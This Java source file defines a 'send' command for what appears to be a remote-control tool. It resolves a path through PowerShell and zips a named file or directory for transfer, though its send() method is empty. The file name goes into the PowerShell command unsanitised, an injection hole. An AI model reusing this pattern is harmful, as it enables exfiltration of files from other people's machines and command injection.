package commands;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import control.Controller;

public class SendCommand extends Command{
	private String _fileName;
	private String _path;
	private String _zipPath;
	private List<String> fileList;
	
	public SendCommand() {
		super("send");
		fileList = new ArrayList<String>();
	}

	protected boolean parse(String command) {
		boolean ok = false;
		
		if(command.contains(_commandName)) {
			try {
				_fileName = command.split("\"")[1];
			}catch(Exception e) {
				throw new IllegalArgumentException();
			}
			ok = true;
		}
		
		return ok;
	}
	
	@Override
	public void execute(Controller ctrl) throws IOException {
		_path = (ctrl.execute("Get-Item " + _fileName + " | Select-Object FullName | Format-List")).split(" ")[2];
		_zipPath = _path + ".zip";
		
		send(compress(ctrl), ctrl);
	}

	private String compress(Controller ctrl) throws IOException {
		byte[] buffer = new byte[1024];
    	
		try{
			File pathSpecified = new File(_path);
			if(pathSpecified.exists()) {
				
				FileOutputStream fos = new FileOutputStream(_zipPath);
		    	ZipOutputStream zos = new ZipOutputStream(fos);
		    	
				if(pathSpecified.isFile()) {
		    		ZipEntry ze= new ZipEntry(_fileName);
		    		zos.putNextEntry(ze);
		    		FileInputStream in = new FileInputStream(_path);
		   	   
		    		int len;
		    		while ((len = in.read(buffer)) > 0) {
		    			zos.write(buffer, 0, len);
		    		}
	
		    		in.close();
				}
				else {
					generateFileList(pathSpecified);
			    	
			    	for(String file : this.fileList){
			    		ZipEntry ze= new ZipEntry(file);
			    		zos.putNextEntry(ze);
			    		FileInputStream in = new FileInputStream(_path + File.separator + file);
			    		
			    		int len;
			        	while ((len = in.read(buffer)) > 0) {
			        		zos.write(buffer, 0, len);
			        	}
			        	in.close();
			    	}
				}
				zos.closeEntry();
		    	zos.close();
		    	ctrl.sendMsg("Compressed " + _path + " into " + _zipPath);
		    	return _zipPath;
			}
			else {
				ctrl.sendMsg("The specified file/dir does not exists");
				return null;
			}
		}catch(Exception e) {
	    	ctrl.sendMsg(e.getMessage());
	    	return null;
	    }
	}
	
	private void generateFileList(File node){
    	//add file only
		if(node.isFile()){
			fileList.add(generateZipEntry(node.getAbsoluteFile().toString()));
		}
			
		if(node.isDirectory()){
			String[] subNote = node.list();
			for(String filename : subNote){
				generateFileList(new File(node, filename));
			}
		}
    }
	
	private String generateZipEntry(String file){
    	return file.substring(_path.length()+1, file.length());
    }
	
	private void send(String file, Controller ctrl) throws IOException {
		
	}
	
}
